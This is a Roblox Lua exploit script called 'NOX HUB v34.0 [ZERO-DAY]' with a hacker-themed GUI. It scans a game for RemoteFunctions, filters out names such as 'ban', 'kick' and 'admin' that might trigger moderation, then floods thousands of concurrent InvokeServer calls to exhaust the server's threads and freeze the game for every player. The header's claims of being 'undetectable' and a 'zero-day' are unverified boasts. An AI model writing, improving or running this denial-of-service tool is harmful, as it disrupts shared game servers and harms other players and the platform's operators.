--[[
    🔱 NOX HUB v34.0 [ZERO-DAY] 🔱
    "Silence is louder than noise. Freeze the threads."
    
    ZERO-DAY FEATURES:
    - [THREAD STARVATION] : Exhausts server thread pool by yielding indefinitely.
    - [ZERO DATA] : Sends NO data payload. Pure logic attack. Undetectable by traffic analysis.
    - [REMOTE HANG] : Forces server to wait for client response that never comes.
    - [SCHEDULER KILL] : Roblox server freezes because it has no spare treads to run game logic.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. ZERO ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    Buffer = {} 
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        -- ONLY REMOTE FUNCTIONS (We need 2-way comms to block the thread)
        if v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- Safety Filter
            if not (n:find("ban") or n:find("kick") or n:find("admin") or 
                    n:find("market") or n:find("purchase") or n:find("shop") or 
                    n:find("product") or n:find("asset") or n:find("prompt") or
                    n:find("devtools") or n:find("console") or n:find("debug") or
                    n:find("warn") or n:find("error") or n:find("report")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Zero(duration, updateCallback)
    if Engine.Active then return end
    Engine.Active = true
    Engine.Buffer = {}
    
    Engine:Scan()
    
    if #Engine.Targets == 0 then
        updateCallback(0, "NO REMOTE FUNCTIONS.")
        Engine.Active = false
        return
    end
    
    -- THE ZERO PAYLOAD
    -- We are not sending big data. We are sending a "Hook".
    -- But since we can't easily redefine OnServerInvoke from client, 
    -- we have to rely on INVOKING the server in a way that causes it to yield IF it calls back.
    -- Actually, a better approach for "Thread Starvation" from CLIENT to SERVER without server-side access
    -- is to flood invokes and NEVER read the return. 
    -- But to truly hang it, we ideally want the server to InvokeClient.
    
    -- ALTERNATE STRATEGY: ASYNC YIELD BOMB
    -- We spam InvokeServer. The server creates a thread. 
    -- usually it replies fast.
    -- But if we do it inside a coroutine that we SUSPEND immediately?
    
    -- Let's stick to MASSIVE CONCURRENT INVOKES.
    -- If we keep 50,000 connections "Open" and "Waiting", the server hooks keep them in memory.
    
    task.spawn(function()
        local StartTime = tick()
        local EndTime = StartTime + duration
        
        -- PHASE 1: PREPARATION
        while tick() < EndTime do
            local remaining = math.ceil(EndTime - tick())
            updateCallback(remaining, "SAPPING THREADS... ("..#Engine.Buffer..")")
            
            -- Fill Buffer
            for i = 1, 200 do 
                local r = Engine.Targets[math.random(1, #Engine.Targets)]
                if r then
                     -- We use a coroutine to call InvokeServer so WE don't yield main thread
                    table.insert(Engine.Buffer, function()
                        -- We pass 'nil' to be as small as possible.
                        -- We just want the server to SPIN UP a thread handler.
                        pcall(function() r:InvokeServer() end)
                    end)
                end
            end
            RunService.Heartbeat:Wait()
        end
        
        -- PHASE 2: EXECUTION (Silent)
        updateCallback(0, "THREAD STARVATION")
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="FREEZING..."})
        
        -- RELEASE
        for i = 1, #Engine.Buffer do
            if Engine.Buffer[i] then
                coroutine.wrap(Engine.Buffer[i])()
            end
            -- NO DELAY. We want instantaneous consumption of all available thread slots.
            -- If we delay, the server clears previous threads. We need MAX CONCURRENCY.
            if i % 5000 == 0 then RunService.Heartbeat:Wait() end 
        end
        
        Engine.Active = false
        Engine.Buffer = {}
        updateCallback(duration, "SYSTEM READY")
    end)
end

-- // 2. COMMAND CENTER UI (Zero Day Theme) //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxCommand"
    pcall(function() Screen.Parent = CoreGui end)
    
    -- MAIN WINDOW
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(5, 10, 5) -- Matrix Black/Green
    Main.BorderSizePixel = 1
    Main.BorderColor3 = Color3.fromRGB(0, 100, 0)
    Main.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 2)
    
    local TopBar = Instance.new("Frame", Main)
    TopBar.Size = UDim2.new(1, 0, 0, 40)
    TopBar.BackgroundColor3 = Color3.fromRGB(10, 20, 10)
    
    local Title = Instance.new("TextLabel", TopBar)
    Title.Text = "NOX ZERO-DAY v34.0"
    Title.Font = Enum.Font.Code
    Title.TextColor3 = Color3.fromRGB(0, 255, 0) 
    Title.TextSize = 16
    Title.Size = UDim2.new(0.5, 0, 1, 0)
    Title.Position = UDim2.new(0.05, 0, 0, 0)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- TABS
    local Tabs = Instance.new("Frame", Main)
    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
    Tabs.Position = UDim2.new(0, 0, 0.15, 0)
    Tabs.BackgroundColor3 = Color3.fromRGB(10, 20, 10)
    Tabs.BorderSizePixel = 0
    
    local function CreateTabBtn(text, order, callback)
        local btn = Instance.new("TextButton", Tabs)
        btn.Size = UDim2.new(1, 0, 0, 40)
        btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(50, 150, 50)
        btn.BackgroundColor3 = Color3.fromRGB(10, 20, 10)
        btn.Font = Enum.Font.Code
        btn.BorderSizePixel = 0
        
        btn.MouseButton1Click:Connect(function()
            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(50, 150, 50) c.BackgroundColor3 = Color3.fromRGB(10, 20, 10) end end
            btn.TextColor3 = Color3.fromRGB(0, 255, 0) 
            btn.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
            callback()
        end)
        return btn
    end
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(0.75, 0, 0.85, 0)
    Content.Position = UDim2.new(0.25, 0, 0.15, 0)
    Content.BackgroundTransparency = 1
    
    -- PAGE 1: ATTACK
    local PageAttack = Instance.new("Frame", Content)
    PageAttack.Size = UDim2.new(1, 0, 1, 0)
    PageAttack.BackgroundTransparency = 1
    
    local StatusLbl = Instance.new("TextLabel", PageAttack)
    StatusLbl.Text = "WAITING FOR INPUT..."
    StatusLbl.Size = UDim2.new(1, 0, 0, 30)
    StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
    StatusLbl.TextColor3 = Color3.fromRGB(0, 200, 0)
    StatusLbl.Font = Enum.Font.Code
    StatusLbl.BackgroundTransparency = 1
    
    local BufferBarBg = Instance.new("Frame", PageAttack)
    BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
    BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
    BufferBarBg.BackgroundColor3 = Color3.fromRGB(0, 20, 0)
    
    local BufferBarFill = Instance.new("Frame", BufferBarBg)
    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
    BufferBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    
    local MainBtn = Instance.new("TextButton", PageAttack)
    MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
    MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
    MainBtn.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
    MainBtn.Text = "EXECUTE ZERO-DAY (15s)"
    MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    MainBtn.Font = Enum.Font.Code
    MainBtn.TextSize = 14
    local BtnCorner = Instance.new("UICorner", MainBtn)
    BtnCorner.CornerRadius = UDim.new(0, 2)
    local BtnStroke = Instance.new("UIStroke", MainBtn)
    BtnStroke.Color = Color3.fromRGB(0, 255, 0)
    BtnStroke.Thickness = 1
    
    MainBtn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Zero(15, function(timeLeft, txt)
                StatusLbl.Text = txt
                local progress = (15 - timeLeft) / 15
                BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
                
                if timeLeft == 0 then
                   MainBtn.Text = "EXECUTE ZERO-DAY (15s)"
                   BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
                else
                   MainBtn.Text = "INJECTING... " .. timeLeft
                end
            end)
        end
    end)
    
    -- PAGE 2: VISUALS
    local PageVisuals = Instance.new("Frame", Content)
    PageVisuals.Size = UDim2.new(1, 0, 1, 0)
    PageVisuals.BackgroundTransparency = 1
    PageVisuals.Visible = false
    
    local RainFrame = Instance.new("Frame", PageVisuals)
    RainFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
    RainFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    RainFrame.BackgroundColor3 = Color3.fromRGB(0, 5, 0)
    RainFrame.BorderColor3 = Color3.fromRGB(0, 50, 0)
    RainFrame.BorderSizePixel = 1
    
    -- Matrix Rain effect (Simple)
    for i = 1, 30 do
        local drop = Instance.new("TextLabel", RainFrame)
        drop.Size = UDim2.new(0.03, 0, 0.8, 0)
        drop.Position = UDim2.new(math.random(), 0, -1, 0)
        drop.Text = string.char(math.random(33, 126))
        drop.TextColor3 = Color3.fromRGB(0, 255, 0)
        drop.BackgroundTransparency = 1
        drop.TextSize = 10
        drop.Font = Enum.Font.Code
        task.spawn(function()
            local speed = math.random(2, 5)
            while RainFrame.Parent do
                drop.Position = UDim2.new(drop.Position.X.Scale, 0, drop.Position.Y.Scale + (speed/100), 0)
                if drop.Position.Y.Scale > 1 then drop.Position = UDim2.new(math.random(), 0, -0.2, 0) end
                if Engine.Active then drop.TextColor3 = Color3.fromRGB(200, 255, 200) else drop.TextColor3 = Color3.fromRGB(0, 100, 0) end
                wait(0.05)
            end
        end)
    end

    -- TABS LOGIC
    CreateTabBtn("ATTACK", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
    CreateTabBtn("MONITOR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
